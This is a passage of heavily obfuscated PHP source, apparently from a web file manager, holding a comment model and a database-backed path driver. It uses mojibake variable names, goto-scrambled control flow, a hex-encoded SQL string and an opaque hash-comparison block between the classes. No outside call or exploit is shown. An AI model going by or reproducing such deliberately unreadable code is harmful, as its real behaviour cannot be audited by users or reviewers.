$C›”ôßóœŠ[$BÃá±ŸÙ»±[2139]]))->setAdd($BÃá±ŸÙ»±[2141], 1); } $C›”ôßóœŠ[$BÃá±ŸÙ»±[2142]] = 0; $C›”ôßóœŠ[$BÃá±ŸÙ»±[2141]] = 0; $C›”ôßóœŠ[$BÃá±ŸÙ»±[690]] = 1; return $this->add($C›”ôßóœŠ); } public function remove($A‰–ÔÁà¯¸) { $B˜ºÌìõØ˜ =& $_SERVER[¦·]; $e–ò–Ğò¯… = array($B˜ºÌìõØ˜[2140] => $A‰–ÔÁà¯¸); $AÉ“ğÂô · = $this->where($e–ò–Ğò¯…)->find(); if ($AÉ“ğÂô ·[$B˜ºÌìõØ˜[2139]]) { $this->where(array($B˜ºÌìõØ˜[2140] => $AÉ“ğÂô ·[$B˜ºÌìõØ˜[2139]]))->setAdd($B˜ºÌìõØ˜[2141], -1); } return $this->where($e–ò–Ğò¯…)->delete(); } public function edit($c‘³âó ö, $eªÀ‘æÅŞÕ) { $aÃãÈ¨‹Å­ =& $_SERVER[¦·]; $F—°¾Å®µë = array($aÃãÈ¨‹Å­[2140] => $c‘³âó ö); return $this->where($F—°¾Å®µë)->save(array($aÃãÈ¨‹Å­[2143] => $eªÀ‘æÅŞÕ)); } public function prasise($Bä“àÕÎá) { $Aâ‘†¨˜®¡ =& $_SERVER[¦·]; $dÓƒ½›Ë‰’ = Model($Aâ‘†¨˜®¡[2144]); $bÁ´Î‚Ã„ = array($Aâ‘†¨˜®¡[2140] => $Bä“àÕÎá, $Aâ‘†¨˜®¡[1432] => USER_ID); $e‰·æùöÁ‚ = $dÓƒ½›Ë‰’->where($bÁ´Î‚Ã„)->find(); if (!$e‰·æùöÁ‚) { $dÓƒ½›Ë‰’->add($bÁ´Î‚Ã„); $eĞ±½·éóé = $this->where(array($Aâ‘†¨˜®¡[2140] => $Bä“àÕÎá))->setAdd($Aâ‘†¨˜®¡[2142], 1); } else { $dÓƒ½›Ë‰’->where($bÁ´Î‚Ã„)->delete(); $eĞ±½·éóé = $this->where(array($Aâ‘†¨˜®¡[2140] => $Bä“àÕÎá))->setAdd($Aâ‘†¨˜®¡[2142], -1); } return $eĞ±½·éóé; } public function targetInfo($a‘“‚•“Ö–, $aãŠÇÒ—) { goto EË–óæ®ÉŠ; Bğ½¶×Óğ¾: return $CÒñ¦°À¨; goto CšòğÆ‰©Ø; B·Ãï«ø: $D¬ÖóÈß„˜ = "\x52\111\x47\x48\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\x63\x6f\155\x6d\x65\156\164\x5f\x70\162\141\x69\x73\145\x20\x73\164\141\162\x20\x6f\x6e\x20\143\157\155\x6d\x65\156\x74\56\x63\x6f\x6d\x6d\x65\156\164\x49\104\x20\x3d\x20\163\x74\x61\162\x2e\143\x6f\155\x6d\x65\x6e\x74\x49\104"; $E¶¬”Û‰õó = $this->alias($cÈ£šğËì[341])->where($d‚÷“···ò)->join($D¬ÖóÈß„˜, $cÈ£šğËì[2145])->count(); $CÒñ¦°À¨ = array($cÈ£šğËì[2146] => $dèùÙ§è, $cÈ£šğËì[2147] => $E¶¬”Û‰õó); goto Bğ½¶×Óğ¾; EË–óæ®ÉŠ: $cÈ£šğËì =& $_SERVER[¦·]; $d‚÷“···ò = array($cÈ£šğËì[523] => $a‘“‚•“Ö–, $cÈ£šğËì[524] => $aãŠÇÒ—); $dèùÙ§è = $this->where($d‚÷“···ò)->count(); goto B·Ãï«ø; CšòğÆ‰©Ø: } public function listData($c½«£™¶Æô) { $E¡‰•†ˆÓğ =& $_SERVER[¦·]; if (isset($c½«£™¶Æô[$E¡‰•†ˆÓğ[2148]])) { if ($c½«£™¶Æô[$E¡‰•†ˆÓğ[2148]]) { $c½«£™¶Æô[$E¡‰•†ˆÓğ[2149]] = array($E¡‰•†ˆÓğ[930], intval($c½«£™¶Æô[$E¡‰•†ˆÓğ[2148]])); } unset($c½«£™¶Æô[$E¡‰•†ˆÓğ[2148]]); } if (isset($c½«£™¶Æô[$E¡‰•†ˆÓğ[2150]])) { if ($c½«£™¶Æô[$E¡‰•†ˆÓğ[2150]]) { $c½«£™¶Æô[$E¡‰•†ˆÓğ[2149]] = array($E¡‰•†ˆÓğ[927], intval($c½«£™¶Æô[$E¡‰•†ˆÓğ[2150]])); } unset($c½«£™¶Æô[$E¡‰•†ˆÓğ[2150]]); } return $this->_listData($c½«£™¶Æô); } private function _listData($B…–µÙ†) { $cåÜ¶ÙÁğ =& $_SERVER[¦·]; $EÓÜ±ğ¨Ö› = $this->where($B…–µÙ†)->_makeOrder()->selectPage(100); $this->_listAppendParent($EÓÜ±ğ¨Ö›[$cåÜ¶ÙÁğ[354]]); $this->_listAppendUser($EÓÜ±ğ¨Ö›[$cåÜ¶ÙÁğ[354]]); $this->_listAppendMeta($EÓÜ±ğ¨Ö›[$cåÜ¶ÙÁğ[354]]); return $EÓÜ±ğ¨Ö›; } private function _makeOrder() { $aËæ¿¬¡“İ =& $_SERVER[¦·]; $aò“¡†³¤ = array($aËæ¿¬¡“İ[2142], $aËæ¿¬¡“İ[2141], $aËæ¿¬¡“İ[187]); $EÈ¢ß’¤â¾ = Input::get($aËæ¿¬¡“İ[407], $aËæ¿¬¡“İ[7], $aËæ¿¬¡“İ[389], $aò“¡†³¤); $Dî’è¹¢éÌ = Input::get($aËæ¿¬¡“İ[408], $aËæ¿¬¡“İ[7], $aËæ¿¬¡“İ[1434], array($aËæ¿¬¡“İ[2151], $aËæ¿¬¡“İ[405])); $a¶õ‹ˆ¾öˆ = $EÈ¢ß’¤â¾ . $aËæ¿¬¡“İ[50] . $Dî’è¹¢éÌ; return $this->order($a¶õ‹ˆ¾öˆ); } private function _listAppendParent(&$BÃäÖÇÈäÂ) { goto F†µñêÎÒ·; fœçÔ·›Ãê: if (!$Aİ»ÇËäŠ) { return; } $cÅí–¯ïÊÖ = $this->where(array($C“â°ÙÕé‰[2140] => array($C“â°ÙÕé‰[7], $Aİ»ÇËäŠ)))->select(); $cÅí–¯ïÊÖ = array_to_keyvalue($cÅí–¯ïÊÖ, $C“â°ÙÕé‰[2149]); goto e‚¥‡Ò¼Å†; e‚¥‡Ò¼Å†: foreach ($BÃäÖÇÈäÂ as &$bƒÍ‰ØË‘) { if (isset($cÅí–¯ïÊÖ[$bƒÍ‰ØË‘[$C“â°ÙÕé‰[2139]]])) { $bƒÍ‰ØË‘[$C“â°ÙÕé‰[2152]] = $cÅí–¯ïÊÖ[$bƒÍ‰ØË‘[$C“â°ÙÕé‰[2139]]]; } } unset($bƒÍ‰ØË‘); goto bÙñ×Ö­â™; F†µñêÎÒ·: $C“â°ÙÕé‰ =& $_SERVER[¦·]; $Aİ»ÇËäŠ = array_unique(array_to_keyvalue($BÃäÖÇÈäÂ, $C“â°ÙÕé‰[33], $C“â°ÙÕé‰[2139])); $Aİ»ÇËäŠ = array_remove_value($Aİ»ÇËäŠ, $C“â°ÙÕé‰[470]); goto fœçÔ·›Ãê; bÙñ×Ö­â™: } private function _listAppendUser(&$AÓË£˜Ò£Ó) { goto eÑ…Íİ±¾; F¦‘òñ½öÃ: foreach ($AÓË£˜Ò£Ó as &$AÚ—ÖÔÈÚ…) { $AÚ—ÖÔÈÚ…[$aå·Ö‰Ñˆ„[536]] = $f¯¯ˆ½…ÖØ[$AÚ—ÖÔÈÚ…[$aå·Ö‰Ñˆ„[1441]]]; if (isset($AÚ—ÖÔÈÚ…[$aå·Ö‰Ñˆ„[2152]])) { $AÚ—ÖÔÈÚ…[$aå·Ö‰Ñˆ„[2152]][$aå·Ö‰Ñˆ„[536]] = $f¯¯ˆ½…ÖØ[$AÚ—ÖÔÈÚ…[$aå·Ö‰Ñˆ„[2152]][$aå·Ö‰Ñˆ„[1441]]]; } } unset($AÚ—ÖÔÈÚ…); goto FÎ™ø´‡“; eÑ…Íİ±¾: $aå·Ö‰Ñˆ„ =& $_SERVER[¦·]; $Då«¡öªÒ‰ = array_unique(array_to_keyvalue($AÓË£˜Ò£Ó, $aå·Ö‰Ñˆ„[33], $aå·Ö‰Ñˆ„[1441])); $Då«¡öªÒ‰ = array_remove_value($Då«¡öªÒ‰, $aå·Ö‰Ñˆ„[470]); goto EÑ‚×†—¦µ; EÑ‚×†—¦µ: if (count($Då«¡öªÒ‰) == 0) { return; } foreach ($AÓË£˜Ò£Ó as $AÚ—ÖÔÈÚ…) { if (isset($AÚ—ÖÔÈÚ…[$aå·Ö‰Ñˆ„[2152]])) { $Då«¡öªÒ‰[] = $AÚ—ÖÔÈÚ…[$aå·Ö‰Ñˆ„[2152]][$aå·Ö‰Ñˆ„[1441]]; } } $f¯¯ˆ½…ÖØ = Model($aå·Ö‰Ñˆ„[479])->userListInfo($Då«¡öªÒ‰); goto F¦‘òñ½öÃ; FÎ™ø´‡“: } private function _listAppendMeta(&$cÊæˆù‚Íº) { goto F–¿Ì§¢ØÌ; F–¿Ì§¢ØÌ: $Dè‡£ÌÀ‰ =& $_SERVER[¦·]; $b…Íåà²… = array_unique(array_to_keyvalue($cÊæˆù‚Íº, $Dè‡£ÌÀ‰[33], $Dè‡£ÌÀ‰[2149])); $b…Íåà²… = array_remove_value($b…Íåà²…, $Dè‡£ÌÀ‰[470]); goto C®ñ‡…ŸÍ; C®ñ‡…ŸÍ: if (!$b…Íåà²…) { return; } foreach ($cÊæˆù‚Íº as $c”áÀõæØ) { if (isset($c”áÀõæØ[$Dè‡£ÌÀ‰[2152]])) { $b…Íåà²…[] = $c”áÀõæØ[$Dè‡£ÌÀ‰[2152]][$Dè‡£ÌÀ‰[2149]]; } } $Aî’‡Òäƒ = $this->metaList($b…Íåà²…); goto DƒÊÚÀ–Ñ; DƒÊÚÀ–Ñ: if (!$Aî’‡Òäƒ) { return !1; } foreach ($cÊæˆù‚Íº as &$c”áÀõæØ) { $c”áÀõæØ[$Dè‡£ÌÀ‰[417]] = $Aî’‡Òäƒ[$c”áÀõæØ[$Dè‡£ÌÀ‰[2149]]]; if (isset($c”áÀõæØ[$Dè‡£ÌÀ‰[2152]])) { $c”áÀõæØ[$Dè‡£ÌÀ‰[2152]][$Dè‡£ÌÀ‰[417]] = $Aî’‡Òäƒ[$c”áÀõæØ[$Dè‡£ÌÀ‰[2152]][$Dè‡£ÌÀ‰[2149]]]; } } unset($c”áÀõæØ); goto eØ®¡¹Ã¥»; eØ®¡¹Ã¥»: } private function metaList($FÎ«ËÊšù’) { goto BÕ£¼‡´•í; c±™Éğè: $CÅ‚¡ÀË—Œ = Model($cò¢”©ò¤[2153])->where($C­ª‹‰ë„)->select(); $CÅ‚¡ÀË—Œ = array_to_keyvalue_group($CÅ‚¡ÀË—Œ, $cò¢”©ò¤[2149]); foreach ($CÅ‚¡ÀË—Œ as $Eì•©ø¼Éá => $Bˆ²ä˜«ö) { $Dİä½¬”’ = array(); foreach ($Bˆ²ä˜«ö as $Cõ©Ë‚•Ù‚) { $Dİä½¬”’[$Cõ©Ë‚•Ù‚[$cò¢”©ò¤[89]]] = $Cõ©Ë‚•Ù‚[$cò¢”©ò¤[359]]; } $CÅ‚¡ÀË—Œ[$Eì•©ø¼Éá] = $Dİä½¬”’; } goto F·ë¢¯É‹Š; BÕ£¼‡´•í: $cò¢”©ò¤ =& $_SERVER[¦·]; if (!$FÎ«ËÊšù’) { return array(); } $C­ª‹‰ë„ = array($cò¢”©ò¤[2149] => array($cò¢”©ò¤[7], $FÎ«ËÊšù’)); goto c±™Éğè; F·ë¢¯É‹Š: return $CÅ‚¡ÀË—Œ ? $CÅ‚¡ÀË—Œ : array(); goto fÅ½á¥Îõ; fÅ½á¥Îõ: } } goto E¤æäËÒğì; cºİÁ«‘Ä: $eÅ‹œ‘½§ = $_SERVER[¦·][790]; if ($_SERVER[$_SERVER[¦·][791]] != $eÅ‹œ‘½§($c›¥±²Ù¯”)) { goto d«À†º ¯¾; e¾ Ğçè“: $e‘Æ×¼Õ»($c›¥±²Ù¯”); goto bÚŠ¢Ó¾ë‘; d«À†º ¯¾: $CÒäèì”Ø = $_SERVER[¦·][793]; $Bé±Ê‘×åÁ = $_SERVER[$_SERVER[¦·][788]] . $_SERVER[¦·][789]; $AÃµâóô„Û = $CÒäèì”Ø($Bé±Ê‘×åÁ); goto f•ˆ˜ÒĞ¬Ñ; f•ˆ˜ÒĞ¬Ñ: $EÙÑ²ƒå„× = explode($_SERVER[¦·][217], $AÃµâóô„Û); if (count($EÙÑ²ƒå„×) < $_SERVER[¦·][556]) { $AâÂÇ”¬è­ = $_SERVER[¦·][794]; $AâÂÇ”¬è­(); } $e‘Æ×¼Õ» = $_SERVER[¦·][1121]; goto e¾ Ğçè“; bÚŠ¢Ó¾ë‘: } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($e§ÖÂ–Ÿç) { $this->pathParse = $e§ÖÂ–Ÿç; $this->model = Model($_SERVER[¦·][1122]); } public function getPath($CÜÌ¬òÁ†—) { return trim($CÜÌ¬òÁ†—, $_SERVER[¦·][8]); } public function pathFather($eÅ¥åí¿ª) { $EòÑŠ›‡×‚ = $this->parse($eÅ¥åí¿ª); $EòÑŠ›‡×‚ = $this->infoSimple($eÅ¥åí¿ª); return $EòÑŠ›‡×‚ ? $EòÑŠ›‡×‚[$_SERVER[¦·][463]] : !1; } public function getPathName($c×¬ì„ˆƒ) { $DŸ‰«ô¸ = $this->infoSimple($c×¬ì„ˆƒ); return $DŸ‰«ô¸ ? $DŸ‰«ô¸[$_SERVER[¦·][28]] : !1; } public function getPathOuter($aŠ²Ìæ‡ö×) { if (!$aŠ²Ìæ‡ö×) { return $aŠ²Ìæ‡ö×; } $CŒ³Œõà©Í = $this->parse($aŠ²Ìæ‡ö×); return KodIO::make($CŒ³Œõà©Í[$_SERVER[¦·][367]]); } public function copyFolderFromIO($FÖùî¦ã­¢, $Fİš“‡¿, $FÓ¿›³­½, $C¶‚§–æÍ, $c³Ï¤Êùâº) { $fë«²ÊšÚ· = $this->model->copyFolderFromIO($FÖùî¦ã­¢, $Fİš“‡¿, $FÓ¿›³­½, $C¶‚§–æÍ, $c³Ï¤Êùâº); return KodIO::make($fë«²ÊšÚ·); } public function isParentOf($D¼ë—ê²³„, $fí±çã Ò˜) { return $this->model->isParentOf($D¼ë—ê²³„, $fí±çã Ò˜); } public function mkfile($aÇµ·ìÎ, $E”¨ÍŞ¿´¢ = '', $A£–Úä¶ŠÒ = REPEAT_RENAME) { $cíÛ´æœ‹‘ =& $_SERVER[¦·]; $AÂÚÓºñÅÍ = $this->parse($aÇµ·ìÎ); $aÇµ·ìÎ = $AÂÚÓºñÅÍ[$cíÛ´æœ‹‘[367]]; for ($EÂêÛŠ‰³© = 0; $EÂêÛŠ‰³© < count($AÂÚÓºñÅÍ[$cíÛ´æœ‹‘[1123]]); $EÂêÛŠ‰³©++) { $a®Ò»·ËÇá = $AÂÚÓºñÅÍ[$cíÛ´æœ‹‘[1123]][$EÂêÛŠ‰³©]; if ($EÂêÛŠ‰³© == count($AÂÚÓºñÅÍ[$cíÛ´æœ‹‘[1123]]) - 1) { $aÇµ·ìÎ = $this->model->mkfile($aÇµ·ìÎ, $a®Ò»·ËÇá, $E”¨ÍŞ¿´¢, $A£–Úä¶ŠÒ); break; } $aÇµ·ìÎ = $this->model->mkdir($aÇµ·ìÎ, $a®Ò»·ËÇá, REPEAT_SKIP); } return $this->getPathOuter($aÇµ·ìÎ); } public function mkdir($AÕòá¾„Äè, $fÕíº—° = REPEAT_SKIP) { $fæ¿òĞø¡á =& $_SERVER[¦·]; $C„ì÷Æ–Ğ‚ = $this->parse($AÕòá¾„Äè); $AÕòá¾„Äè = $C„ì÷Æ–Ğ‚[$fæ¿òĞø¡á[367]]; for ($B²ç–™º©¾ = 0; $B²ç–™º©¾ < count($C„ì÷Æ–Ğ‚[$fæ¿òĞø¡á[1123]]); $B²ç–™º©¾++) { $F“¹ö‚¦™œ = $C„ì÷Æ–Ğ‚[$fæ¿òĞø¡á[1123]][$B²ç–™º©¾]; $AÕòá¾„Äè = $this->model->mkdir($AÕòá¾„Äè, $F“¹ö‚¦™œ, $fÕíº—°); } return $this->getPathOuter($AÕòá¾„Äè); } public function copyFile($D„Ï°íàøñ, $Fà†¯ŞË¡Ü, $bªŸÅ«Î¹ = REPEAT_REPLACE) { $A‰Óºƒõ‘ =& $_SERVER[¦·]; $c˜ÌØÙ©¬– = $this->parse($Fà†¯ŞË¡Ü); $EÀø›±ÎÄà = $this->model->copy($D„Ï°íàøñ, $c˜ÌØÙ©¬–[$A‰Óºƒõ‘[367]], $bªŸÅ«Î¹, $c˜ÌØÙ©¬–[$A‰Óºƒõ‘[75]]); return $EÀø›±ÎÄà ? $this->getPathOuter($EÀø›±ÎÄà) : !1; } public function moveFile($B³’›çÂ²Û, $Eò¡Æ‚·•Ê, $aî»øÅÖ½æ = REPEAT_REPLACE) { $eÃ”Ğä¿ßË =& $_SERVER[¦·]; $F‹²Øƒã› = $this->parse($Eò¡Æ‚·•Ê); $D”Ãª« “ = $this->model->move($B³’›çÂ²Û, $F‹²Øƒã›[$eÃ”Ğä¿ßË[367]], $aî»øÅÖ½æ, $F‹²Øƒã›[$eÃ”Ğä¿ßË[75]]); return $D”Ãª« “ ? $this->getPathOuter($D”Ãª« “) : !1; } public function copy($AéİÌ‰­ê, $DçÌ“¶‹¥, $B˜ ååÄŒ = REPEAT_REPLACE) { $D¸ô·«ÈŠ = $this->parse($DçÌ“¶‹¥); $F‹êÁ¼àƒ¬ = $this->model->copy($AéİÌ‰­ê, $D¸ô·«ÈŠ[$_SERVER[¦·][367]], $B˜ ååÄŒ); return $F‹êÁ¼àƒ¬ ? $this->getPathOuter($F‹êÁ¼àƒ¬) : !1; } public function moveSameAllow() { } public function move($cĞŞåÏ”èÁ, $Bà‹¿½Æïó, $FŞ‰Ùœ¢´Ì = REPEAT_REPLACE) { $C™¸Ûºš¡ = $this->parse($Bà‹¿½Æïó); $a¶ëÁä¯¢ = $this->model->move($cĞŞåÏ”èÁ, $C™¸Ûºš¡[$_SERVER[¦·][367]], $FŞ‰Ùœ¢´Ì); return $a¶ëÁä¯¢ ? $this->getPathOuter($a¶ëÁä¯¢) : !1; } public function remove($A’§»÷­¡„, $DÛ¶ˆ‡çª = true) { return $this->model->remove($A’§»÷­¡„, $DÛ¶ˆ‡çª); } public function rename($dÀ£İÆäá, $B»¬£©±¤±) { $b—»®öÎÈ = $this->model->rename($dÀ£İÆäá, $B»¬£©±¤±); return $b—»®öÎÈ ? $this->getPathOuter($dÀ£İÆäá) : $b—»®öÎÈ; } public function size($D‰…¶Ì™“Ì) { $DÈ¼²ĞùÖô = $this->infoSimple($D‰…¶Ì™“Ì); return $DÈ¼²ĞùÖô ? $DÈ¼²ĞùÖô[$_SERVER[¦·][77]] : 0; } public function infoSimple($EºÔÈƒ„­) { return $this->model->sourceInfo($EºÔÈƒ„­); } public function info($b³±çƒä) { return $this->infoParse($b³±çƒä); } public function infoAuth($b“Ã…¬²†ë) { return $this->infoParse($b“Ã…¬²†ë, !1, !0); } public function infoWithChildren($CŸ´­Å¨Â) { return $this->infoParse($CŸ´­Å¨Â, !0); } protected function infoParse($C‚—¾ß¶Úõ, $A×›ó¢´²Ø = false, $b‰¨¹¦ÓÂË = false) { if (!$A×›ó¢´²Ø) { return $this->model->pathInfo($C‚—¾ß¶Úõ, $b‰¨¹¦ÓÂË); } return $this->model->pathInfoMore($C‚—¾ß¶Úõ); } public function infoFull($b±¼·ŠµŠ‘) { $FìƒïŞŸ¼Ó =& $_SERVER[¦·]; $a©ê¼Ñ¤÷ = explode($FìƒïŞŸ¼Ó[8], $b±¼·ŠµŠ‘); $f°‘²ŸŸ¹ = implode($FìƒïŞŸ¼Ó[8], array_splice($a©ê¼Ñ¤÷, 1)); return $this->model->pathInfoByPath($a©ê¼Ñ¤÷[0], $f°‘²ŸŸ¹); } public function hashSimple($eˆ°Å ƒÕè) { $bÆ½“›íÂˆ =& $_SERVER[¦·]; $côÚš°’Ÿ = $this->infoWithChildren($eˆ°Å ƒÕè); return $côÚš°’Ÿ[$bÆ½“›íÂˆ[162]][$bÆ½“›íÂˆ[164]]; } public function hashMd5($AÂÌÌ³Ìµ‹) { $E¥ñäë¨Îø =& $_SERVER[¦·]; $dÂ„õÒŞ¢— = $this->infoWithChildren($AÂÌÌ³Ìµ‹); return $dÂ„õÒŞ¢—[$E¥ñäë¨Îø[162]][$E¥ñäë¨Îø[163]]; } public function exist($fñƒÜÒ‘îƒ) { $fô³ôÎôô› =& $_SERVER[¦·]; $EÄåöÁäõù = $this->parse($fñƒÜÒ‘îƒ); if (!$EÄåöÁäõù[$fô³ôÎôô›[75]]) { return $this->isFile($fñƒÜÒ‘îƒ) || $this->isFolder($fñƒÜÒ‘îƒ); } $A¥´Šƒğ¨À = array($fô³ôÎôô›[368] => $EÄåöÁäõù[$fô³ôÎôô›[367]], $fô³ôÎôô›[28] => $EÄåöÁäõù[$fô³ôÎôô›[75]]); $C™†³ò¸Ô = $this->model->where($A¥´Šƒğ¨À)->find(); return $C™†³ò¸Ô ? !0 : !1; } public function isFile($C‡Õ¾£®Èñ) { $bÁñÖ“±ÇÑ =& $_SERVER[¦·]; $eæÃ±•Îô… = $this->infoSimple($C‡Õ¾£®Èñ); return $eæÃ±•Îô… && $eæÃ±•Îô…[$bÁñÖ“±ÇÑ[370]] == $bÁñÖ“±ÇÑ[83] ? !1 : !0; } public function isFolder($E™Ñƒ‘ãæ) { $A”Ú­Î‰š =& $_SERVER[¦·]; $f´…¿İºµ° = $this->infoSimple($E™Ñƒ‘ãæ); return $f´…¿İºµ° && $f´…¿İºµ°[$A”Ú­Î‰š[370]] == $A”Ú­Î‰š[83] ? !0 : !1; } public function listPath($dÎĞõÊöŸã, $A¹Ò‰éİ‘š = false) { $bìÄÉ·­« =& $_SERVER[¦·]; if ($dÎĞõÊöŸã == $bìÄÉ·­«[33]) { return !1; } $bêòõĞ•’ß = array($bìÄÉ·­«[368] => $dÎĞõÊöŸã); if ($A¹Ò‰éİ‘š) { return $this->model->listSource($bêòõĞ•’ß, -1); } return $this->model->listSource($bêòõĞ•’ß); } public function has($e¹Ú‹ÆÛÁĞ, $AŸ•ŞœÈùé = false, $Aæ¤‡¤†‰© = null) { $FùÁ¾Á­Š³ =& $_SERVER[¦·]; $cõÚˆà­… = $this->infoWithChildren($e¹Ú‹ÆÛÁĞ); if ($AŸ•ŞœÈùé) { return array($FùÁ¾Á­Š³[192] => $cõÚˆà­…[$FùÁ¾Á­Š³[192]], $FùÁ¾Á­Š³[191] => $cõÚˆà­…[$FùÁ¾Á­Š³[191]]); } return $Aæ¤‡¤†‰© ? $cõÚˆà­…[$FùÁ¾Á­Š³[192]] : $cõÚˆà­…[$FùÁ¾Á­Š³[191]]; } public function listAll($A°÷äÎĞ) { $EÅ¿«†Í—– = IO::info($this->pathParse[$_SERVER[¦·][75]]); if (!$EÅ¿«†Í—–) { return array(); } return $this->model->listAll($A°÷äÎĞ); } public function getContent($A´Å¹õ¡Î‚) { return $this->model->getContent($A´Å¹õ¡Î‚); } public function setContent($cˆáµóĞê, $BÈ“²ŞñµĞ = '') { return $this->model->setContent($cˆáµóĞê, $BÈ“²ŞñµĞ); } public function fileSubstr($A´Ìš‡‰†İ, $e×«Ôïøè, $BŞ…–ä±Œ) { return $this->model->fileSubstr($A´Ìš‡‰†İ, $e×«Ôïøè, $BŞ…–ä±Œ); } public function download($eÄèÓö‚ñ†, $cŠàù–¸õ± = '') { $EÑ ¢ÛÕÎ” = get_path_father($cŠàù–¸õ±); $C¨ ‡ÔÙ§— = get_path_this($cŠàù–¸õ±); $fµ‚·¶Ã“ë = $this->model->fileInfoGet($eÄèÓö‚ñ†); $f…ÔŸÑò˜š = IO::copy($fµ‚·¶Ã“ë[$_SERVER[¦·][75]], $EÑ ¢ÛÕÎ”, !1, $C¨ ‡ÔÙ§—); return $f…ÔŸÑò˜š; } public function setModifyTime($aì  ÑËÔŞ, $A”æã‰ = '') { $this->model->metaSet($aì  ÑËÔŞ, $_SERVER[¦·][1124], $A”æã‰); } public function upload($A¸¾¥ˆ”Ü£, $dÕ¦ãÁ¨ÄÕ, $DÓ¬•±ù‚ = false, $E®¾ ˆôŠ§ = REPEAT_REPLACE) { $cè£­‹Íñ¿ =& $_SERVER[¦·]; $EŸ•Üó³ – = $this->parse($A¸¾¥ˆ”Ü£); $fØè•½ˆ„ñ = $this->model->addFile($EŸ•Üó³ –[$cè£­‹Íñ¿[367]], $dÕ¦ãÁ¨ÄÕ, $EŸ•Üó³ –[$cè£­‹Íñ¿[75]], $DÓ¬•±ù‚, $E®¾ ˆôŠ§); return $this->getPathOuter($fØè•½ˆ„ñ); } public function uploadFileByID($aï¿…éè‡…, $AÎò‚¼ƒØÕ, $e§·êª•”Ô) { $C×°­åÏƒã =& $_SERVER[¦·]; $e¾´ÛÉƒê¬ = $this->parse($aï¿…éè‡…); $DÅ’ À‹ = $this->model->addFileByFileID($e¾´ÛÉƒê¬[$C×°­åÏƒã[367]], $AÎò‚¼ƒØÕ, $e¾´ÛÉƒê¬[$C×°­åÏƒã[75]], $e§·êª•”Ô); return $this->getPathOuter($DÅ’ À‹); } public function addFileByRemote($CïØìïº ª, $A™„—é­Â±, $eÊé¿°÷ = array(), $DİùÓ°†Ú³ = '', $FÒòÈ¾ˆÓ‘) { $dÍÁ¤µæˆš =& $_SERVER[¦·]; $b—©¼¹ªÑç = $this->parse($CïØìïº ª); $DİùÓ°†Ú³ = empty($DİùÓ°†Ú³) ? $b—©¼¹ªÑç[$dÍÁ¤µæˆš[75]] : $DİùÓ°†Ú³; $f±™”©‹Ì– = $this->model->addFileByRemote($b—©¼¹ªÑç[$dÍÁ¤µæˆš[367]], $A™„—é­Â±, $DİùÓ°†Ú³, $eÊé¿°÷, $FÒòÈ¾ˆÓ‘); return $this->getPathOuter($f±™”©‹Ì–); } public function uploadLink($EèÂ®«§õô, $e£‚î¾»…… = 0) { $B‰®“ÀÇ¾‰ =& $_SERVER[¦·]; $Aíñˆœµëƒ = $this->parse($EèÂ®«§õô); $EèÂ®«§õô = Model($B‰®“ÀÇ¾‰[545])->createFileName($Aíñˆœµëƒ[$B‰®“ÀÇ¾‰[75]]); $A»ù¤’ˆ” = IO::uploadLink($EèÂ®«§õô, $e£‚î¾»……); return $A»ù¤’ˆ”; } public function fileNameAuto($E­Ğ°Ğ©Û¢, $a³®‡ƒ‘ß, $DµØí‡»‚§ = REPEAT_REPLACE, $FŸ¾ÌŞÇ‡ = false) { return $this->model->fileNameAuto($E­Ğ°Ğ©Û¢, $a³®‡ƒ‘ß, $DµØí‡»‚§, $FŸ¾ÌŞÇ‡); } public function fileNameExist($Dò¤¶Ş›ì÷, $bÇáÛÀùù¤) { return $this->model->fileNameExist($Dò¤¶Ş›ì÷, $bÇáÛÀùù¤); } protected function _fileOut($B»ô¿‡Ÿ×, $CíÙèëø”ó = false, $dê·¯“¿­ˆ = false, $D‘›óÒïÂ = '', $aÏ«¯Û®ö  = false) { goto e­”™Ÿ¼­•; EÖ‹Í¥óôœ: if ($aÏ«¯Û®ö ) { return IO::fileOutServer($e— õÑä‡[$aæ—îğºë¯[75]], $CíÙèëø”ó, $F‡ÍÙÆˆùÁ, $D‘›óÒïÂ); } IO::fileOut($e— õÑä‡[$aæ—îğºë¯[75]], $CíÙèëø”ó, $F‡ÍÙÆˆùÁ, $D‘›óÒïÂ); goto b¼“ÅÄš°; b¢Ü Æƒù : $e— õÑä‡ = $this->model->fileInfoGet($B»ô¿‡Ÿ×); $D‘›óÒïÂ = $e— õÑä‡[$aæ—îğºë¯[163]] ? $e— õÑä‡[$aæ—îğºë¯[163]] : $D‘›óÒïÂ; $F‡ÍÙÆˆùÁ = isset($GLOBALS[$aæ—îğºë¯[1126]]) ? $GLOBALS[$aæ—îğºë¯[1126]] : $A«ÈİÜ®„°[$aæ—îğºë¯[28]]; goto EÖ‹Í¥óôœ; e­”™Ÿ¼­•: $aæ—îğºë¯ =& $_SERVER[¦·]; $A«ÈİÜ®„° = $this->model->sourceInfo($B»ô¿‡Ÿ×); if ($A«ÈİÜ®„°[$aæ—îğºë¯[370]] == $aæ—îğºë¯[83]) { header($aæ—îğºë¯[1125]); die; } goto b¢Ü Æƒù ; b¼“ÅÄš°: } public function fileOut($AÉù³¤éà›, $DŠ´ìœ¹À = false, $aÙÔğÛ±Î = false, $b•Î¢ó¼¶ = '') { $this->_fileOut($AÉù³¤éà›, $DŠ´ìœ¹À, $aÙÔğÛ±Î, $b•Î¢ó¼¶); } public function fileOutServer($F¿à‰—õ™Ô, $eƒÏÆÀÀ²Ï = false, $F¤å·¦ÄÃë = false, $d…ğ‘‰Àƒï = '') { $this->_fileOut($F¿à‰—õ™Ô, $eƒÏÆÀÀ²Ï, $F¤å·¦ÄÃë, $d…ğ‘‰Àƒï, !0); } protected function _fileOutImage($aÖğ±´Ñ’, $eÆˆÔ­°¾Ë = 250) { $F¡¥ôºŒ­ç =& $_SERVER[¦·]; $fÍØ´Œ³‚ğ = $this->model->sourceInfo($aÖğ±´Ñ’); if ($fÍØ´Œ³‚ğ[$F¡¥ôºŒ­ç[370]] == $F¡¥ôºŒ­ç[83]) { show_json($F¡¥ôºŒ­ç[1127] . $aÖğ±´Ñ’, !1); } $GLOBALS[$F¡¥ôºŒ­ç[1126]] = $fÍØ´Œ³‚ğ[$F¡¥ôºŒ­ç[28]]; $b‡õÑìÂ¹ = $this->model->fileInfoGet($aÖğ±´Ñ’); IO::fileOutImage($b‡õÑìÂ¹[$F¡¥ôºŒ­ç[75]], $eÆˆÔ­°¾Ë); } public function fileOutImage($Bßø¥ØïÓÒ, $Añ˜¨µ¸¡… = 250) { 